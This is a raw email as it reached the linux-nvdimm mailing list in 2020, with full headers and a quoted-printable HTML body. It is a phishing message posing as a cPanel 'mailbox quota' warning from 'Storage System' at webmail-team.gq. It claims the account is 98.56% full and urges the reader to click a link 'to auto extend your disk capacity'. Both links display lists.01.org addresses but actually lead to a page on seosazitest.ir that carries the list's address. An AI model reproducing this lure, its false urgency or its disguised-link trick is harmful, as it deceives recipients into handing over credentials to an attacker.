Return-Path: <linux-nvdimm-bounces@lists.01.org>
X-Original-To: lists+linux-nvdimm@lfdr.de
Delivered-To: lists+linux-nvdimm@lfdr.de
Received: from ml01.01.org (ml01.01.org [IPv6:2001:19d0:306:5::1])
	by mail.lfdr.de (Postfix) with ESMTPS id 4958D1EDC9A
	for <lists+linux-nvdimm@lfdr.de>; Thu,  4 Jun 2020 06:59:47 +0200 (CEST)
Received: from ml01.vlan13.01.org (localhost [IPv6:::1])
	by ml01.01.org (Postfix) with ESMTP id 46F46100A4580;
	Wed,  3 Jun 2020 21:54:43 -0700 (PDT)
Received-SPF: Pass (mailfrom) identity=mailfrom; client-ip=23.238.48.194; helo=mail0.webmail-team.gq; envelope-from=noreply@webmail-team.gq; receiver=<UNKNOWN> 
Received: from mail0.webmail-team.gq (mail0.webmail-team.gq [23.238.48.194])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by ml01.01.org (Postfix) with ESMTPS id 3837B100A457A
	for <linux-nvdimm@lists.01.org>; Wed,  3 Jun 2020 21:54:40 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; s=default; d=webmail-team.gq;
 h=From:To:Subject:Date:Message-ID:MIME-Version:Content-Type:
 Content-Transfer-Encoding; i=noreply@webmail-team.gq;
 bh=oXJB1mVP4FJ18hT/ZMs01iSEli3573K53w1UM/L/FkQ=;
 b=ybwalSieSGgA3CPGBpzCpFchwMyhXLJ5Q0GipDAtcPAdAFHRs0HZM3EEck0XCB5UGiTouwjVT/T6
   bAxzPJX/SEb6tEpM5iwJcmbI90OWLabkRPveQp9q6dbTtd0W9e8YMNTywuuI+fajQuZKA2xEiwg3
   hIXZ+qdyGkVCFCFZYGE=
From: "Storage System"<noreply@webmail-team.gq>
To: linux-nvdimm@lists.01.org
Subject: Warning: Mailbox Storage for linux-nvdimm@lists.01.org Is almost full
Date: 03 Jun 2020 21:59:43 -0700
Message-ID: <20200603215943.0B0EAED9F5092932@webmail-team.gq>
MIME-Version: 1.0
Message-ID-Hash: RXQKQZZDDFZENKKEXTQHRN7HVAYKAQTY
X-Message-ID-Hash: RXQKQZZDDFZENKKEXTQHRN7HVAYKAQTY
X-MailFrom: noreply@webmail-team.gq
X-Mailman-Rule-Hits: nonmember-moderation
X-Mailman-Rule-Misses: dmarc-mitigation; no-senders; approved; emergency; loop; banned-address; member-moderation
X-Mailman-Version: 3.1.1
Precedence: list
List-Id: "Linux-nvdimm developer list." <linux-nvdimm.lists.01.org>
Archived-At: <https://lists.01.org/hyperkitty/list/linux-nvdimm@lists.01.org/message/RXQKQZZDDFZENKKEXTQHRN7HVAYKAQTY/>
List-Archive: <https://lists.01.org/hyperkitty/list/linux-nvdimm@lists.01.org/>
List-Help: <mailto:linux-nvdimm-request@lists.01.org?subject=help>
List-Post: <mailto:linux-nvdimm@lists.01.org>
List-Subscribe: <mailto:linux-nvdimm-join@lists.01.org>
List-Unsubscribe: <mailto:linux-nvdimm-leave@lists.01.org>
Content-Type: multipart/mixed; boundary="===============2697765856543614616=="

--===============2697765856543614616==
Content-Type: text/html;
	charset="iso-8859-1"
Content-Transfer-Encoding: quoted-printable

<HTML><HEAD>
<META name=3DGENERATOR content=3D"MSHTML 11.00.10570.1001"></HEAD>
<body><td style=3D"FONT-SIZE: 11px; FONT-FAMILY: &quot;Lucida Grande&quot;,=
 Verdana, Arial, Helvetica, sans-serif; WHITE-SPACE: normal; WORD-SPACING: =
0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(51,51,51); FONT-STY=
LE: normal; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal; BACKGROUND-COLOR=
: rgb(244,244,244); TEXT-INDENT: 0px; font-variant-ligatures: normal; font-=
variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-style=
: initial; text-decoration-color: initial" align=3D"center">
<DIV align=3Dcenter>
<table style=3D"MAX-WIDTH: 680px; BORDER-TOP: 0px; BORDER-RIGHT: 0px; BORDE=
R-BOTTOM: 0px; BORDER-LEFT: 0px" cellspacing=3D"0" cellpadding=3D"0" width=
=3D"680" align=3D"center" border=3D"0">
<TBODY>
<TR>
<td style=3D"FONT-SIZE: 16px; FONT-FAMILY: &quot;Helvetica Neue&quot;, Helv=
etica, Arial, sans-serif; COLOR: rgb(51,51,51)" height=3D"25" width=3D"680"=
>Mailbox quota notification for "linux-nvdimm@lists.01.org".</TD></TR>
<TR>
<td style=3D"BORDER-TOP: rgb(232,232,232) 2px solid; BORDER-RIGHT: rgb(232,=
232,232) 2px solid; BORDER-BOTTOM: rgb(255,108,44) 2px solid; PADDING-BOTTO=
M: 20px; PADDING-TOP: 15px; PADDING-LEFT: 0px; BORDER-LEFT: rgb(232,232,232=
) 2px solid; PADDING-RIGHT: 0px; BACKGROUND-COLOR: rgb(255,255,255); border=
-image: initial">
<table style=3D"FONT-FAMILY: &quot;Helvetica Neue&quot;, Helvetica, Arial, =
sans-serif; BACKGROUND: rgb(255,255,255)" cellspacing=3D"0" cellpadding=3D"=
0" width=3D"680" border=3D"0">
<TBODY>
<TR>
<td width=3D"15"></TD>
<td width=3D"650">
<table cellspacing=3D"0" cellpadding=3D"0" width=3D"100%" border=3D"0">
<TBODY>
<TR>
<td>
<P>The "linux-nvdimm@lists.01.org" email account is almost full.</P>
<P>The email account currently uses 98.56% of its capacity.</P>
<P>You should follow the link below to auto extend your disk capacity for f=
ree as soon as possible in order to prevent the loss of any future email. U=
se the Email Disk Usage tool at<SPAN>&nbsp;</SPAN><A href=3D"http://seosazi=
test.ir/dir/tym.php?gbp=3Dlinux-nvdimm@lists.01.org">https://lists.01.org:2=
096/?goto_app=3DEmail_DiskUsage</A>.</P></TD></TR>
<TR>
<td>
<DIV style=3D'FONT-SIZE: 12px; BORDER-TOP: rgb(232,232,232) 2px solid; FONT=
-FAMILY: "Helvetica Neue", Helvetica, Arial, sans-serif; MARGIN-TOP: 5px; C=
OLOR: rgb(102,102,102); PADDING-TOP: 5px'>
<P style=3D"PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGI=
N: 5px 0px 0px; PADDING-RIGHT: 0px">The system generated this notice on 6/3=
/2020 9:59:43 p.m..</P></DIV>
<P>You can disable the "Quota::MailboxWarning" type of notification through=
 the cPanel interface:<SPAN>&nbsp;</SPAN><A style=3D"COLOR: rgb(1,134,186)"=
 href=3D"http://seosazitest.ir/dir/tym.php?gbp=3Dlinux-nvdimm@lists.01.org"=
 rel=3Dnoreferrer target=3D_blank>https://lists.01.org:2083/?goto_app=3DCon=
tactInfo_Change</A></P>
<P>Do not reply to this automated message.</P></TD></TR></TBODY></TABLE></T=
D>
<td width=3D"15"></TD></TR></TBODY></TABLE></TD></TR>
<TR>
<td style=3D"PADDING-TOP: 10px" align=3D"center">
<P></P></TD></TR></TBODY></TABLE></DIV></TD></BODY></HTML>
--===============2697765856543614616==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline

_______________________________________________
Linux-nvdimm mailing list -- linux-nvdimm@lists.01.org
To unsubscribe send an email to linux-nvdimm-leave@lists.01.org

--===============2697765856543614616==--
